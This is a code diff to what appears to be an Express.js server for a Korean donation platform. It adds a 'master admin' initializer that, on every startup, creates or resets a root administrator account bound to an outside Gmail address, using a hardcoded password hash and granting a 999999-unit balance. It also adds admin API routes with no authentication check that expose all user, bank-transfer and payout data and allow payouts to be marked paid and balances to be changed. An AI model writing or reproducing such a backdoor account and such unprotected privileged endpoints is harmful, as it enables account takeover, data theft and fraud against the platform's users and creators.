@@ -108,6 +108,50 @@ function sanitizeUser(user) {
 }
 
 // =====================================================================
+// MASTER ADMIN ACCOUNT INITIALIZER (root / zeze1.sec@gmail.com)
+// =====================================================================
+function ensureAdminAccount() {
+  const db = readDb();
+  if (!Array.isArray(db.users)) db.users = [];
+
+  const adminEmail = 'zeze1.sec@gmail.com';
+  let admin = db.users.find(u => (u.email || '').toLowerCase() === adminEmail);
+
+  const salt = '53100712c9388c2aaeb09d74426ed1ec';
+  const passwordHash = '64e72bbff787049047debb40d09ee9fc735934246caaae896e3bda363c4ca6d3';
+
+  if (!admin) {
+    admin = {
+      id: 'usr_admin_root',
+      email: adminEmail,
+      name: 'root',
+      handle: 'root',
+      role: 'admin',
+      passwordHash,
+      salt,
+      avatar: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=300&q=80',
+      carrotsBalance: 999999,
+      tickets: 999,
+      createdAt: new Date().toISOString()
+    };
+    db.users.unshift(admin);
+    writeDb(db);
+    console.log(`👑 [Master Admin] Account initialized: ${adminEmail} (role: admin, name: root)`);
+  } else {
+    admin.role = 'admin';
+    admin.name = 'root';
+    admin.handle = 'root';
+    admin.passwordHash = passwordHash;
+    admin.salt = salt;
+    writeDb(db);
+    console.log(`👑 [Master Admin] Account verified: ${adminEmail} (role: admin, name: root)`);
+  }
+}
+
+// Call on startup
+ensureAdminAccount();
+
+// =====================================================================
 // SYSTEM HEALTH CHECK
 // =====================================================================
 app.get('/health', (req, res) => {
@@ -807,6 +851,107 @@ app.get('/api/stats', (req, res) => {
       totalUsers: (db.users || []).length,
       totalDonationCount: (db.donations || []).length
     }
+  });
+});
+
+// =====================================================================
+// MASTER ADMIN CONSOLE API (root / zeze1.sec@gmail.com)
+// =====================================================================
+
+// 8-1. ADMIN FULL OVERVIEW (실시간 전사 데이터 대시보드)
+app.get('/api/admin/overview', (req, res) => {
+  const db = readDb();
+  
+  const totalDonations = (db.donations || []).reduce((acc, d) => acc + (d.amountKRW || 0), 0);
+  const totalPlatformFees = (db.donations || []).reduce((acc, d) => acc + (d.platformFee || 0), 0);
+  const totalRechargeKRW = (db.charges || []).filter(c => c.status && c.status.includes('완료')).reduce((acc, c) => acc + (c.amount || 0), 0);
+  const pendingPayoutsKRW = (db.payouts || []).filter(p => p.status && !p.status.includes('완료')).reduce((acc, p) => acc + (p.amount || 0), 0);
+  const pendingBankTransfers = (db.bankTransfers || []).filter(b => b.status && b.status.includes('대기'));
+
+  res.json({
+    success: true,
+    data: {
+      metrics: {
+        totalGMV: totalDonations,
+        platformRevenue: totalPlatformFees,
+        totalRechargeKRW,
+        pendingPayoutsKRW,
+        pendingBankTransferCount: pendingBankTransfers.length,
+        totalUsers: (db.users || []).length,
+        totalCreators: (db.creators || []).length,
+        totalDonationCount: (db.donations || []).length
+      },
+      users: (db.users || []).map(u => sanitizeUser(u)),
+      creators: db.creators || [],
+      donations: (db.donations || []).slice(0, 50),
+      charges: (db.charges || []).slice(0, 50),
+      bankTransfers: db.bankTransfers || [],
+      payouts: db.payouts || []
+    }
+  });
+});
+
+// 8-2. ADMIN CONFIRM CREATOR PAYOUT (출금 송금 완료 처리)
+app.post('/api/admin/payouts/:id/complete', (req, res) => {
+  const { id } = req.params;
+  const db = readDb();
+
+  const payout = (db.payouts || []).find(p => p.id === id);
+  if (!payout) {
+    return res.status(404).json({ success: false, message: '정산 신청 건을 찾을 수 없습니다.' });
+  }
+
+  payout.status = '정산 입금 완료 (송금 완료)';
+  payout.completedAt = new Date().toISOString();
+  writeDb(db);
+
+  res.json({
+    success: true,
+    data: payout,
+    message: `${payout.creatorId} 크리에이터님의 정산 송금 처리가 완료되었습니다.`
+  });
+});
+
+// 8-3. ADMIN USER CARROT ADJUSTMENT (CS 및 이벤트용 당근 수동 지급/회수)
+app.post('/api/admin/users/:userId/carrots', (req, res) => {
+  const { userId } = req.params;
+  const { amount, reason } = req.body;
+  const numAmount = parseInt(amount, 10);
+
+  if (isNaN(numAmount) || numAmount === 0) {
+    return res.status(400).json({ success: false, message: '지급 또는 회수할 올바른 당근 수량을 입력해주세요.' });
+  }
+
+  const db = readDb();
+  const user = (db.users || []).find(u => u.id === userId || u.email === userId);
+  if (!user) {
+    return res.status(404).json({ success: false, message: '사용자를 찾을 수 없습니다.' });
+  }
+
+  user.carrotsBalance = Math.max(0, (user.carrotsBalance || 0) + numAmount);
+
+  // Record audit log in charges
+  if (!Array.isArray(db.charges)) db.charges = [];
+  db.charges.unshift({
+    id: `ADJ_${Date.now()}`,
+    orderId: `ADMIN-ADJ-${Date.now()}`,
+    userId: user.id,
+    userName: user.name,
+    amount: numAmount * 100,
+    carrots: numAmount,
+    bonusCarrots: 0,
+    totalCarrots: numAmount,
+    method: `관리자 수동 조정 (${reason || 'CS/이벤트'})`,
+    status: '관리자 수동 완료',
+    createdAt: new Date().toISOString()
+  });
+
+  writeDb(db);
+
+  res.json({
+    success: true,
+    data: sanitizeUser(user),
+    message: `${user.name}님의 당근 잔액이 ${numAmount > 0 ? `+${numAmount}` : numAmount}개 조정되었습니다.`
   });
 });
 
